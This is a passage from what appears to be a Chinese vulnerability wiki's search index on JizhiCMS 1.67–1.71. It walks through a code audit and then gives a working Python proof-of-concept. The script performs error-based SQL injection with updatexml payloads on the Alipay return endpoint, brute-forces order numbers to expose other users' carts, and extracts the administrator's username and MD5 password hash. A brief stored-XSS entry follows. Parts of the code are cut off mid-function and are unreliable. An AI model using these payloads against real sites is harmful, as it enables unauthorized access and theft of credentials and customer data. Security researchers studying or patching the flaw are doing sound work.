ORDER BY \".$order; } if(!empty($limit))$where .= \" LIMIT {$limit}\"; $fields = empty($fields) ? \"*\" : $fields; $sql = \"SELECT {$fields} FROM {$this->table} {$where}\"; return $this->getData($sql); } 在跟进一下getData函数 //获取数据 public function getData($sql) { if(!$result = $this->query($sql))return array(); if(!$this->Statement->rowCount())return array(); $rows = array(); while($rows[] = $this->Statement->fetch(PDO::FETCH_ASSOC)){} $this->Statement=null; array_pop($rows); return $rows; } 跟进query执行函数 //执行SQL语句并检查是否错误 public function query($sql){ $this->filter[] = $sql; $this->Statement = $this->pdo->query($sql); if ($this->Statement) { return $this; }else{ $msg = $this->pdo->errorInfo(); if($msg[2]) exit('数据库错误：' . $msg[2] . end($this->filter)); } } 看到$msg = $this->pdo->errorInfo();语句，也就是说会把数据库报错信息打印在页面上并显示出来并退出 一套分析下来没有发现对sql语句的过滤，如果得到的数据没有经过format_param过滤，会产生注入 例如: function exploit(){ M('member')->find(['username'=>$_GET['name']]); } 如果直接这样GET POST REQUEST 带入数据库 会产生报错注入 例如 ./exploit/name=123' (加一个引号会报错，如果引号没过滤) 现在只需要寻找类型是这样没过滤直接带入数据库的语句就行了 简单寻找下其实这样的地方挺多的，拿一个位置举例子 这里是一个支付插件的位置，蓝色方块1增加代码模拟开通支付宝功能通过验证 可以看到这个函数只使用[htmlspecialchars]来过滤了xss，sql语句没有过滤，用刚刚的方法来注入 可以看到的确出现了sql语句和数据库错误 直接报错注入获取敏感信息mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+\" import requests import re \"\"\" 官网url : https://www.jizhicms.cn/ \"\"\" def main(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: 极致CMS 1.67 - 171 \\033[0m') print('+ \\033[36m使用格式: python3 CNVD-2020-49710.py \\033[0m') print('+------------------------------------------') while True: poc = str(input('选择使用的poc：\\n' '1.sql注入\\n' '2.用户购物车爆破\\n' '3.GET 网站管理员账号密码\\n' '4.退出 quit\\n' 'poc:')) print('------------------ peiqi -----------------------') if poc == '1': poc_1() elif poc == '2': poc_2() elif poc == '3': poc_3() elif poc == '4': break else: print('参数错误，重新输入') def poc_1(): ## poc_1 ---> sql注入漏洞点( Home/c/MypayController.php [alipay_notify_pay]) ## 使用范围 极致cms 1.71 + 1.7 + 1.67 版本 \"\"\" function alipay_return_pay(){ extendFile('pay/alipay/AlipayServiceCheck.php'); //支付宝公钥，账户中心->密钥管理->开放平台密钥，找到添加了支付功能的应用，根据你的加密类型，查看支付宝公钥 $alipayPublicKey=$this->webconf['alipay_public_key']; $aliPay = new \\AlipayServiceCheck($alipayPublicKey); //验证签名 $result = $aliPay->rsaCheck($_GET,$_GET['sign_type']); $result=true; 付款成功'; $out_trade_no = htmlspecialchars($_GET['out_trade_no']); find(['orderno'=>$orderno]); 发布时间 2020-05-25]') else: print('得到的数据为:\\n', data) print('------------------ peiqi -----------------------') except: print('出现错误') print('------------------ peiqi -----------------------') # http://jizhicms.com/user/orderdetails/orderno/No20200712213457.html def poc_2(): ## poc_2 ---> 用户购物车页面获取 (Home/c/UserController.php [orderdetails]) ## 漏洞点 ---> 无用户cookie id 的验证 ## 使用范围 极致cms 1.8以下全版本 (当前最新 v1.8 更新时间:6月30日) \"\"\" function orderdetails(){ $orderno = $this->frparam('orderno',1); $order = M('orders')->find(['orderno'=>$orderno]); if($orderno && $order){ /* if($order['isshow']!=1){ //超时或者已支付 if($order['isshow']==0){ $msg = '订单已删除'; } if($order['isshow']==3){ $msg = '订单已过期，不可支付！'; } if($order['isshow']==2){ $msg = '订单已支付，请勿重复操作！'; } if($this->frparam('ajax')){ JsonReturn(['code'=>1,'msg'=>$msg]); } Error($msg); } */ $carts = explode('||',$order['body']); $new = []; foreach($carts as $k=>$v){ $d = explode('-',$v); if($d[0]!=''){ //兼容多模块化 if(isset($this->classtypedata[$d[0]])){ $type = $this->classtypedata[$d[0]]; $res = M($type['molds'])->find(['id'=>$d[1]]); $new[] = ['info'=>$res,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; }else{ $new[] = ['info'=>false,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; } } } $this->carts = $new; $this->order = $order; $this->display($this->template.'/user/orderdetails'); } } \"\"\" try: exploit_url = str(input(\"攻击网站url：\\n\")) year_day = str(input(\"输入日期(例如:20200712):\")) shop = [] # 遍历所有出现的用户购物车页面 for num in range(100000,999999): #payload_url = \"user/orderdetails/orderno/No\" + year_day + str(num) + \".html\" payload_url = \"user/orderdetails/orderno/No20200712213927.html\" response = requests.get(exploit_url + payload_url) # 打印结果 if '总金额' in response.text: print('购物车页面：',payload_url) shop.append(payload_url) for page in shop: print(page) print('------------------ peiqi -----------------------') except: print('出现错误') print('------------------ peiqi -----------------------') def poc_3(): ## poc_3 ---> 得到账号密码 ( Home/c/MypayController.php [alipay_notify_pay]) ## 使用范围 ---> 极致cms 1.71 + 1.7 + 1.67 版本 try: exploit_url = str(input(\"攻击网站url：\\n\")) # payload --> updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+ # 用户名 + 密码 长度 payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) str_long = re.search(r'~(.*?)~',response.text).group(1) #print(str_long) # 得到账号密码，密码md5格式 payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),1,32) from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) admin_name_1 = re.search(r\"~#(.*?)'\", response.text).group(1) #print(admin_name_1) payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),32,\" + str(int(str_long) - 32) +\") from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) admin_name_2 = re.search(r'~(.*?)~', response.text).group(1) #print(admin_name_2) # 分割账号密码 admin_passwd = admin_name_1 + admin_name_2 admin_passwd = admin_passwd.split(':') admin = admin_passwd[0] passwd = admin_passwd[1] #print(admin) #print(passwd) print(\"成功得到账号密码：\\n\" \"用户名:\",admin, \"\\n密码(md5):\",passwd) print('------------------ peiqi -----------------------') except: print('出现错误') print('------------------ peiqi -----------------------') if __name__ == '__main__': main() 购物车爆破没有利用点，关于审计部分参考极致CMS审计 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-03 14:33:19 "},"PeiQi_Wiki/cms_wiki/jizhi_cms/极致CMS 1.81以下版本 存储型XSS.html":{"url":"PeiQi_Wiki/cms_wiki/jizhi_cms/极致CMS 1.81以下版本 存储型XSS.html","title":"极致CMS <1.81 版本 存储型XSS","keywords":"","body":"极致CMS 1.81以下版本 存储型XSS 漏洞复现 登录管理员添加模块 注册用户 点击发布文章 在文章标题处插入xss payload 当管理员访问时XSS成功 参考 极致CMS代码审计 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-03 14:28:26 "}}